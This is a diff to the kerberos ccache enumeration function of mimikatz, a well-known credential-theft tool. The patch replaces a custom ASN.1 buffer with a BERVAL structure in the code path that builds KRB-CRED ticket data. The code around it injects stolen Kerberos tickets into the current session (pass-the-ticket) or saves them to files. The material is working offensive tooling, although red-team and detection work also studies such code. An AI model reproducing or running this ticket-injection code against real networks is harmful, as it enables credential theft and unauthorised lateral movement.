@@ -14,8 +14,7 @@ NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, 
 
 	PKERB_EXTERNAL_NAME principalName; UNICODE_STRING principalRealm;
 	PKIWI_KERBEROS_TICKET ticket;
-	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
-	DWORD App_KrbCred_Size;
+	PBERVAL BerApp_KrbCred;
 	wchar_t * saveFilename;
 
 	if(argc)
@@ -71,27 +70,26 @@ NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, 
 								kuhl_m_kerberos_ticket_display(ticket, TRUE, FALSE);
 								if(isSave || isInject)
 								{
-									if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(ticket, TRUE))
+									if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(ticket, TRUE))
 									{
-										App_KrbCred_Size = kull_m_asn1_getSize(App_KrbCred);
 										if(isInject)
 										{
 											kprintf(L"\n\t   * Injecting ticket : ");
-											if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(App_KrbCred, App_KrbCred_Size)))
+											if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
 												kprintf(L"OK\n");
 										}
 										else
 										{
 											if(saveFilename = kuhl_m_kerberos_ccache_generateFileName(i, ticket, MIMIKATZ_KERBEROS_EXT))
 											{
-												if(kull_m_file_writeData(saveFilename, App_KrbCred, App_KrbCred_Size))
+												if(kull_m_file_writeData(saveFilename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
 													kprintf(L"\n\t   * Saved to file %s !", saveFilename);
 												else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
 
 												LocalFree(saveFilename);
 											}
 										}
-										LocalFree(App_KrbCred);
+										ber_bvfree(BerApp_KrbCred);
 									}
 								}
 							}
